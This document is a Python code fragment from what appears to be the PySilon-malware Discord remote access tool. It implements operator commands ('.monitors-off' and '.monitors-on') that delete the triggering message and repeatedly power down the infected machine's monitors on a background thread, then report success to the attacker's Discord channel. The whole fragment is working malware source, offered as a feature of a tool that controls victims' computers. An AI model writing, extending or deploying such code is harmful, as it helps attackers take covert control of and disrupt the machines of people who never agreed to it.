import monitorcontrol
import threading
# end of imports

# on message
elif message.content == '.monitors-off':
    if not turned_off:
        await message.delete()
        turned_off = True
        def monitor_off():
            while turned_off:
                for monitor in monitorcontrol.get_monitors():
                    with monitor:
                        monitor.set_power_mode(4)

        threading.Thread(target=monitor_off).start()

        embed = discord.Embed(title="🟢 Success",description=f'```Monitor turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)

    else:
        embed = discord.Embed(title="🔴 Hold on!",description=f'```Monitor already turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)

elif message.content == '.monitors-on':
    if turned_off:
        await message.delete()

        for monitor in monitorcontrol.get_monitors():
            with monitor:
                monitor.set_power_mode(1)

        embed = discord.Embed(title="🟢 Success",description=f'```Monitor has been turned on. Turn it off by using .monitors-off```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
        turned_off = False
    else: 
        embed = discord.Embed(title="🔴 Hold on!",description=f'```The monitor is not turned off. Turn it off by using .monitors-off```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
